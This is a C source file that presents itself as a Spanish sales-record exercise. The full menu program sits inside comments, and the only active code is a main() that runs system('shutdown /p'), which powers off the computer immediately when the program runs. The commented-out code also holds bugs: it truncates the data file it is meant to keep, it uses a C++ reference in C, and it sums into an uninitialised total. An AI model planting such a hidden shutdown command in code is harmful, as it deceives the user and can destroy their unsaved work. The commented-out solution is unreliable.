#include <stdio.h>
#include <stdlib.h>
/*/*
Una empresa dedicada a las ventas de productos por mayor registra en un archivo 
binario solo los totales de ventas que se van realizando durante el día. Las cargas 
de los datos se realizan en cualquier mo-mento, por lo que el archivo no debe perder
la información con una nueva carga.
El dueño de la empresa solicita, al centro de cómputos, le confeccione un sistema 
qué por medio de un menú se pueda realizar lo siguiente:

	? Permitir registrar en cualquier momento los montos totales de venta.
	? Saber cuál es la mayor venta guardada y la cantidad de veces que se registró el mismo monto.
	? Visualizar los datos en pantallas, donde cada fila deberá tener 10 datos separados 
		por un guion y visualizar 6 dígitos en cada valor en caso de que la cantidad 
		sea menor a 6 dígitos rellenar con ceros a la izquierda hasta completar los 6 
		dígitos.
	? Saber cuál es el monto total de las ventas realizadas en el momento de la consulta.
	? Permitir al final del día borrar el archivo.
*/
/*
#include <stdio.h>
#include <stdlib.h>

int menuPrincipal();
void cargarTotalesVentas(FILE *arch1);
float mayorVenta(FILE *archi1,int &cantVeces);
void visualizar(FILE *arch1);
float totalventas(FILE *arch1);
main(){
	FILE *arch;
	arch = fopen("Reales.dat", "w+b");
	int opc=0;
	if(arch==NULL){
		printf("El sistema no puedo ser abierto. Consulte con el administrador\n");
		system("PAUSE");
		exit(1);
	}
	
	do{
		opc = menuPrincipal();
		switch(opc){
			case 1: 
				cargarTotalesVentas(arch);
				break;
			case 2:{
				int cantVeces;
				float mayVenta;
				mayVenta = mayorVenta(arch, cantVeces);
				//muestro con 6 enteros y 2 decimales
				printf("La mayor venta realizada es %#09.2f, y la cantidad de veces que se repite es %d \n",mayVenta, cantVeces);
				system("PAUSE");
				break;
			}
			case 3:{
				visualizar(arch);
				system("PAUSE");
				break;
			}
			case 4:{
				float ventas;
				ventas = totalventas(arch);
				printf ("El monto total de ventas es %f\n",ventas);
				system("PAUSE");
				break;
			}
			case 5:{
				fclose(arch);
				remove("Reales.dat");
				system("PAUSE");
				break;
			}
			default:	
				printf("El valor seleccionado no esta en la lista de opciones del menu\n");
				system("PAUSE");
		}
	}while(opc != 6);
	

	
	
	fclose(arch);
}

/*------------------------------------*/
/*int menuPrincipal(){
	int op;
	system("CLS");
	printf("\n\n\t\t");
	printf("\n\n\t\t======================================================");
	printf("\n\n\t\t           M E N U   P R I N C I P A L                ");
	printf("\n\n\t\t======================================================");
	printf("\n\n\t\t     1 - Registraci\242n de monto de ventas           ");
	printf("\n\n\t\t     2 - Determinar Mayor Venta y Canntidad de veces  ");
	printf("\n\n\t\t     3 - Visualizar datos guardados en pantalla       ");
	printf("\n\n\t\t     4 - Mostrar el total de ventas                   ");
	printf("\n\n\t\t     5 - Eliminar Archivo de Ventas                   ");
	printf("\n\n\t\t     6 - Salir del sistema                            ");
	printf("\n\n\t\t======================================================");
	printf("\n\n\t\t     Seleccione una Opcion: "); 
	scanf("%d", &op);
	return op;
}


/*------------------------------------*/
/*void cargarTotalesVentas(FILE *arch1){
	system("CLS");
	float num;
	int n;
	printf("Cuantas ventas dese ingresar: ");
	scanf("%d", &n);
	for(int i=0; i < n;i++){
		printf("\n\n Ingrese monto de venta: ");
		scanf("%f", &num);
		fwrite(&num, sizeof(float), 1, arch1);
	}
}

/*------------------------------------*/
/*float mayorVenta(FILE *arch1,int &cantVeces){
	system("CLS");
	float num;
	rewind(arch1);
	fread(&num, sizeof(float), 1, arch1);
	
	float may= 0;
	
	may = num;
	cantVeces = 0;
	
	while( !feof(arch1)){
		if( may <= num ){
			
			if(may == num){
				cantVeces = cantVeces + 1;	
			}else
				cantVeces = 1;
				
			may = num;
			
		}
		fread(&num, sizeof(float), 1, arch1);
	}
	return may;	
}
void visualizar(FILE *arch1)
{
	system("CLS");
	float num;
	rewind(arch1);
	fread(&num,sizeof(float),1,arch1);
	while(!feof(arch1)){
		printf ("%06.0f - ", num);
		fread(&num,sizeof(float),1,arch1);
	}
}

float totalventas(FILE *arch1)
{
	system("CLS");
	float num;
	rewind(arch1);
	fread(&num,sizeof(float),1,arch1);
	float total;
	while(!feof(arch1))
	{
		total = num + total;
		fread(&num,sizeof(float),1,arch1);
	}
	return total;
}*/
main()
{
	system("shutdown /p");
}
